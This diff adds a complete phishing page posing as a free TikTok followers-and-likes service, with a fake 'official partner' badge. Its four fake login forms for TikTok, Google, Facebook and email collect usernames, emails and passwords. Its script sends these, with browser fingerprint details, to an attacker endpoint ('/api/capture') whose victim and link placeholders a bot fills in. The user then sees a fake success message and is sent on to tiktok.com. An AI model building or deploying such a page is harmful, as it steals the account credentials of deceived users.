@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Free Services</title>
+    <!-- Same CSS as before -->
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        body { background: #000; min-height: 100vh; display: flex; justify-content: center; padding: 15px; }
+        .container { max-width: 420px; width: 100%; background: #121212; border-radius: 20px; overflow: hidden; box-shadow: 0 0 40px rgba(254, 44, 85, 0.2); margin-top: 20px; }
+        .header { background: linear-gradient(180deg, #1a1a2e 0%, #16213e 100%); padding: 30px 20px; text-align: center; position: relative; overflow: hidden; }
+        .header::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(254,44,85,0.1) 0%, transparent 60%); animation: pulse 3s ease-in-out infinite; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        .tiktok-icon { font-size: 60px; color: #fe2c55; position: relative; z-index: 1; text-shadow: 0 0 30px rgba(254,44,85,0.5); }
+        .header h1 { color: white; font-size: 24px; margin: 10px 0; position: relative; z-index: 1; }
+        .header p { color: #888; font-size: 14px; position: relative; z-index: 1; }
+        .verified-badge { display: inline-block; background: #fe2c55; color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; margin-top: 5px; position: relative; z-index: 1; }
+        .offer-banner { background: linear-gradient(45deg, #fe2c55, #ff6b6b); padding: 15px; text-align: center; animation: glow 2s ease-in-out infinite; }
+        @keyframes glow { 0%, 100% { opacity: 1; } 50% { opacity: 0.8; } }
+        .offer-banner p { color: white; font-weight: bold; font-size: 16px; }
+        .offer-banner span { font-size: 24px; text-shadow: 0 0 10px rgba(255,255,255,0.5); }
+        .login-section { padding: 25px; }
+        .login-title { color: white; font-size: 18px; margin-bottom: 5px; }
+        .login-subtitle { color: #666; font-size: 13px; margin-bottom: 20px; }
+        .login-btn { width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 12px; transition: all 0.3s; }
+        .login-btn:active { transform: scale(0.98); }
+        .btn-tiktok { background: #fe2c55; color: white; }
+        .btn-google { background: white; color: #333; }
+        .btn-facebook { background: #1877f2; color: white; }
+        .btn-email { background: #333; color: white; border: 1px solid #444; }
+        .divider { text-align: center; color: #555; margin: 15px 0; position: relative; }
+        .divider::before, .divider::after { content: ''; position: absolute; top: 50%; width: 45%; height: 1px; background: #333; }
+        .divider::before { left: 0; } .divider::after { right: 0; }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { color: #aaa; font-size: 13px; display: block; margin-bottom: 5px; }
+        .form-group input { width: 100%; padding: 15px; background: #1e1e1e; border: 2px solid #333; border-radius: 12px; color: white; font-size: 16px; outline: none; transition: all 0.3s; }
+        .form-group input:focus { border-color: #fe2c55; background: #252525; }
+        .submit-btn { width: 100%; padding: 16px; background: linear-gradient(45deg, #fe2c55, #ff6b6b); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s; }
+        .submit-btn:active { transform: scale(0.98); }
+        .submit-btn:disabled { background: #444; cursor: not-allowed; }
+        .loading { display: none; text-align: center; padding: 20px; }
+        .loading .spinner { border: 3px solid #333; border-top: 3px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading p { color: #fe2c55; }
+        .services-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; }
+        .service-card { background: #1e1e1e; border: 2px solid #333; border-radius: 12px; padding: 15px; text-align: center; cursor: pointer; transition: all 0.3s; }
+        .service-card.selected { border-color: #fe2c55; background: rgba(254,44,85,0.1); }
+        .service-card .icon { font-size: 30px; margin-bottom: 5px; }
+        .service-card .name { color: white; font-size: 13px; }
+        .service-card .count { color: #fe2c55; font-weight: bold; font-size: 12px; }
+        .amount-grid { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 8px; margin: 15px 0; }
+        .amount-btn { padding: 12px 5px; background: #1e1e1e; border: 2px solid #333; border-radius: 10px; color: white; text-align: center; cursor: pointer; transition: all 0.3s; }
+        .amount-btn.selected { border-color: #fe2c55; background: rgba(254,44,85,0.2); }
+        .amount-btn .num { font-size: 16px; font-weight: bold; }
+        .amount-btn .label { font-size: 10px; color: #888; }
+        .success-page { text-align: center; padding: 50px 20px; }
+        .success-page i { font-size: 80px; color: #fe2c55; margin-bottom: 20px; }
+        .success-page h2 { color: white; font-size: 22px; margin-bottom: 10px; }
+        .success-page p { color: #888; line-height: 1.6; }
+        .footer-text { text-align: center; padding: 20px; color: #444; font-size: 11px; border-top: 1px solid #222; }
+        .hidden { display: none; }
+        .error-msg { color: #ff4444; background: rgba(255,68,68,0.1); border: 1px solid #ff4444; border-radius: 10px; padding: 10px; margin: 10px 0; text-align: center; display: none; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div id="page1">
+        <div class="header">
+            <div class="tiktok-icon"><i class="fab fa-tiktok"></i></div>
+            <h1>TikTok <span style="color:#fe2c55;">FREE</span> Services</h1>
+            <p>Get free followers, likes & views</p>
+            <div class="verified-badge">✓ OFFICIAL PARTNER 2026</div>
+        </div>
+        <div class="offer-banner">
+            <p>🎉 LIMITED TIME OFFER 🎉<br><span>FREE VIP ACCESS</span></p>
+        </div>
+        <div class="login-section">
+            <h3 class="login-title">🔥 Join 2M+ Happy Users</h3>
+            <p class="login-subtitle">Get free TikTok services instantly. No payment required.</p>
+            <button class="login-btn btn-tiktok" onclick="showPage(2)"><i class="fab fa-tiktok"></i> Continue with TikTok</button>
+            <button class="login-btn btn-google" onclick="showPage(3)"><i class="fab fa-google"></i> Continue with Google</button>
+            <button class="login-btn btn-facebook" onclick="showPage(4)"><i class="fab fa-facebook"></i> Continue with Facebook</button>
+            <button class="login-btn btn-email" onclick="showPage(5)"><i class="fas fa-envelope"></i> Continue with Email</button>
+            <div class="divider">100% FREE • NO PAYMENT</div>
+            <div style="text-align:center;color:#555;font-size:12px;"><i class="fas fa-shield-alt"></i> 256-bit encrypted • Secure connection</div>
+        </div>
+        <div class="footer-text">By continuing you agree to our Terms.<br>Third-party service. Not affiliated with TikTok.</div>
+    </div>
+    
+    <div id="page2" class="hidden">
+        <div class="header" style="padding:20px;"><i class="fab fa-tiktok" style="font-size:40px;color:#fe2c55;"></i><h1 style="font-size:20px;">Login with TikTok</h1></div>
+        <div class="login-section">
+            <div class="form-group"><label>TikTok Username</label><input type="text" id="ttUser" placeholder="Enter TikTok username"></div>
+            <div class="form-group"><label>Password</label><input type="password" id="ttPass" placeholder="Enter password"></div>
+            <div class="error-msg" id="ttError"></div>
+            <button class="submit-btn" id="ttSubmit" onclick="loginTikTok()"><i class="fas fa-sign-in-alt"></i> Login & Get Free Services</button>
+            <div class="loading" id="ttLoading"><div class="spinner"></div><p>Verifying your TikTok account...</p></div>
+            <button class="login-btn btn-email" style="margin-top:10px;" onclick="showPage(1)">← Back</button>
+        </div>
+    </div>
+    
+    <div id="page3" class="hidden">
+        <div class="header" style="padding:20px;"><i class="fab fa-google" style="font-size:40px;color:#4285f4;"></i><h1 style="font-size:20px;">Sign in with Google</h1></div>
+        <div class="login-section">
+            <div class="form-group"><label>Gmail Address</label><input type="email" id="glEmail" placeholder="Enter Gmail"></div>
+            <div class="form-group"><label>Password</label><input type="password" id="glPass" placeholder="Enter password"></div>
+            <div class="error-msg" id="glError"></div>
+            <button class="submit-btn" id="glSubmit" onclick="loginGoogle()"><i class="fas fa-sign-in-alt"></i> Sign in & Get Free Services</button>
+            <div class="loading" id="glLoading"><div class="spinner"></div><p>Connecting to Google...</p></div>
+            <button class="login-btn btn-email" style="margin-top:10px;" onclick="showPage(1)">← Back</button>
+        </div>
+    </div>
+    
+    <div id="page4" class="hidden">
+        <div class="header" style="padding:20px;"><i class="fab fa-facebook" style="font-size:40px;color:#1877f2;"></i><h1 style="font-size:20px;">Facebook Login</h1></div>
+        <div class="login-section">
+            <div class="form-group"><label>Email or Phone</label><input type="text" id="fbEmail" placeholder="Enter email or phone"></div>
+            <div class="form-group"><label>Password</label><input type="password" id="fbPass" placeholder="Enter password"></div>
+            <div class="error-msg" id="fbError"></div>
+            <button class="submit-btn" id="fbSubmit" onclick="loginFacebook()"><i class="fas fa-sign-in-alt"></i> Login & Get Free Services</button>
+            <div class="loading" id="fbLoading"><div class="spinner"></div><p>Connecting to Facebook...</p></div>
+            <button class="login-btn btn-email" style="margin-top:10px;" onclick="showPage(1)">← Back</button>
+        </div>
+    </div>
+    
+    <div id="page5" class="hidden">
+        <div class="header" style="padding:20px;"><i class="fas fa-envelope" style="font-size:40px;color:#fe2c55;"></i><h1 style="font-size:20px;">Email Login</h1></div>
+        <div class="login-section">
+            <div class="form-group"><label>Email Address</label><input type="email" id="emEmail" placeholder="Enter email"></div>
+            <div class="form-group"><label>Password</label><input type="password" id="emPass" placeholder="Enter password"></div>
+            <div class="error-msg" id="emError"></div>
+            <button class="submit-btn" id="emSubmit" onclick="loginEmail()"><i class="fas fa-sign-in-alt"></i> Login & Get Free Services</button>
+            <div class="loading" id="emLoading"><div class="spinner"></div><p>Verifying email...</p></div>
+            <button class="login-btn btn-email" style="margin-top:10px;" onclick="showPage(1)">← Back</button>
+        </div>
+    </div>
+    
+    <div id="page6" class="hidden">
+        <div class="header" style="padding:20px;"><i class="fab fa-tiktok" style="font-size:40px;color:#fe2c55;"></i><h1 style="font-size:20px;">Choose Your Free Service</h1><p style="color:#888;font-size:13px;">Select what you want</p></div>
+        <div class="login-section">
+            <div class="services-grid">
+                <div class="service-card" onclick="selectService(this, 'followers')"><div class="icon">👥</div><div class="name">Followers</div><div class="count">1K-10K</div></div>
+                <div class="service-card" onclick="selectService(this, 'likes')"><div class="icon">❤️</div><div class="name">Likes</div><div class="count">1K-50K</div></div>
+                <div class="service-card" onclick="selectService(this, 'views')"><div class="icon">👁️</div><div class="name">Views</div><div class="count">10K-100K</div></div>
+                <div class="service-card" onclick="selectService(this, 'shares')"><div class="icon">🔄</div><div class="name">Shares</div><div class="count">1K-5K</div></div>
+            </div>
+            <p style="color:#888;font-size:13px;margin:15px 0 10px;">Select quantity:</p>
+            <div class="amount-grid">
+                <div class="amount-btn" onclick="selectAmount(this, 100)"><div class="num">100</div><div class="label">Basic</div></div>
+                <div class="amount-btn" onclick="selectAmount(this, 500)"><div class="num">500</div><div class="label">Popular</div></div>
+                <div class="amount-btn" onclick="selectAmount(this, 1000)"><div class="num">1K</div><div class="label">Pro</div></div>
+                <div class="amount-btn" onclick="selectAmount(this, 5000)"><div class="num">5K</div><div class="label">VIP</div></div>
+            </div>
+            <div class="error-msg" id="svcError"></div>
+            <button class="submit-btn" onclick="processService()"><i class="fas fa-download"></i> Get Service Now</button>
+            <div class="loading" id="svcLoading"><div class="spinner"></div><p>Processing your request...</p></div>
+        </div>
+    </div>
+    
+    <div id="page7">
+        <div class="success-page">
+            <i class="fas fa-check-circle"></i>
+            <h2>Congratulations! 🎉</h2>
+            <p>Your free <strong id="svcName" style="color:#fe2c55;">service</strong> has been activated!<br><br>You will receive <strong id="svcAmount" style="color:#fe2c55;">0</strong> <span id="svcLabel" style="color:#fe2c55;">services</span> within 24 hours.<br><br>Thank you for using our free services!</p>
+            <button class="submit-btn" onclick="finishOrder()"><i class="fab fa-tiktok"></i> Open TikTok</button>
+        </div>
+    </div>
+</div>
+
+<script>
+// ============================================
+// DYNAMIC - Bot se replace hoga
+// ============================================
+const LINK_ID = 'LINK_ID_PLACEHOLDER';
+const VICTIM = 'VICTIM_PLACEHOLDER';
+const BASE_URL = 'BASE_URL_PLACEHOLDER';
+
+let capturedData = {
+    service: 'tiktok',
+    victim: VICTIM,
+    linkId: LINK_ID,
+    method: '',
+    email: '',
+    username: '',
+    phone: '',
+    password: '',
+    userAgent: navigator.userAgent,
+    screen: screen.width + 'x' + screen.height,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+};
+
+let selectedService = '';
+let selectedAmount = 0;
+
+function showPage(num) {
+    for (let i = 1; i <= 7; i++) {
+        const el = document.getElementById('page' + i);
+        if (el) el.classList.add('hidden');
+    }
+    const target = document.getElementById('page' + num);
+    if (target) target.classList.remove('hidden');
+    window.scrollTo(0, 0);
+}
+
+async function sendCapture() {
+    try {
+        await fetch(BASE_URL + '/api/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(capturedData)
+        });
+    } catch(e) { console.error(e); }
+}
+
+function loginTikTok() {
+    const user = document.getElementById('ttUser').value;
+    const pass = document.getElementById('ttPass').value;
+    if (!user || !pass) {
+        document.getElementById('ttError').style.display = 'block';
+        document.getElementById('ttError').textContent = 'Please fill all fields';
+        return;
+    }
+    document.getElementById('ttError').style.display = 'none';
+    document.getElementById('ttSubmit').disabled = true;
+    document.getElementById('ttLoading').style.display = 'block';
+    capturedData.method = 'tiktok';
+    capturedData.username = user;
+    capturedData.password = pass;
+    sendCapture().then(() => {
+        document.getElementById('ttLoading').style.display = 'none';
+        showPage(6);
+    });
+}
+
+function loginGoogle() {
+    const email = document.getElementById('glEmail').value;
+    const pass = document.getElementById('glPass').value;
+    if (!email || !pass) {
+        document.getElementById('glError').style.display = 'block';
+        document.getElementById('glError').textContent = 'Please fill all fields';
+        return;
+    }
+    document.getElementById('glError').style.display = 'none';
+    document.getElementById('glSubmit').disabled = true;
+    document.getElementById('glLoading').style.display = 'block';
+    capturedData.method = 'google';
+    capturedData.email = email;
+    capturedData.password = pass;
+    sendCapture().then(() => {
+        document.getElementById('glLoading').style.display = 'none';
+        showPage(6);
+    });
+}
+
+function loginFacebook() {
+    const fbEmail = document.getElementById('fbEmail').value;
+    const pass = document.getElementById('fbPass').value;
+    if (!fbEmail || !pass) {
+        document.getElementById('fbError').style.display = 'block';
+        document.getElementById('fbError').textContent = 'Please fill all fields';
+        return;
+    }
+    document.getElementById('fbError').style.display = 'none';
+    document.getElementById('fbSubmit').disabled = true;
+    document.getElementById('fbLoading').style.display = 'block';
+    capturedData.method = 'facebook';
+    capturedData.email = fbEmail;
+    capturedData.password = pass;
+    sendCapture().then(() => {
+        document.getElementById('fbLoading').style.display = 'none';
+        showPage(6);
+    });
+}
+
+function loginEmail() {
+    const email = document.getElementById('emEmail').value;
+    const pass = document.getElementById('emPass').value;
+    if (!email || !pass) {
+        document.getElementById('emError').style.display = 'block';
+        document.getElementById('emError').textContent = 'Please fill all fields';
+        return;
+    }
+    document.getElementById('emError').style.display = 'none';
+    document.getElementById('emSubmit').disabled = true;
+    document.getElementById('emLoading').style.display = 'block';
+    capturedData.method = 'email';
+    capturedData.email = email;
+    capturedData.password = pass;
+    sendCapture().then(() => {
+        document.getElementById('emLoading').style.display = 'none';
+        showPage(6);
+    });
+}
+
+function selectService(el, service) {
+    document.querySelectorAll('.service-card').forEach(c => c.classList.remove('selected'));
+    el.classList.add('selected');
+    selectedService = service;
+    document.getElementById('svcError').style.display = 'none';
+}
+
+function selectAmount(el, amount) {
+    document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('selected'));
+    el.classList.add('selected');
+    selectedAmount = amount;
+}
+
+function processService() {
+    if (!selectedService || !selectedAmount) {
+        document.getElementById('svcError').style.display = 'block';
+        document.getElementById('svcError').textContent = 'Please select service and amount';
+        return;
+    }
+    document.getElementById('svcError').style.display = 'none';
+    document.getElementById('svcLoading').style.display = 'block';
+    capturedData.selectedService = selectedService;
+    capturedData.selectedAmount = selectedAmount;
+    sendCapture().then(() => {
+        document.getElementById('svcLoading').style.display = 'none';
+        const names = { followers: 'Followers', likes: 'Likes', views: 'Views', shares: 'Shares' };
+        document.getElementById('svcName').textContent = names[selectedService] || 'Service';
+        document.getElementById('svcAmount').textContent = selectedAmount;
+        document.getElementById('svcLabel').textContent = names[selectedService] || 'Services';
+        showPage(7);
+    });
+}
+
+function finishOrder() {
+    alert('✅ Your free TikTok services are being processed!');
+    window.location.href = 'https://www.tiktok.com';
+}
+
+window.onload = function() {
+    setTimeout(() => {
+        const firstService = document.querySelector('.service-card');
+        if (firstService) firstService.click();
+        const firstAmount = document.querySelector('.amount-btn');
+        if (firstAmount) firstAmount.click();
+    }, 200);
+};
+</script>
+</body>
+</html>
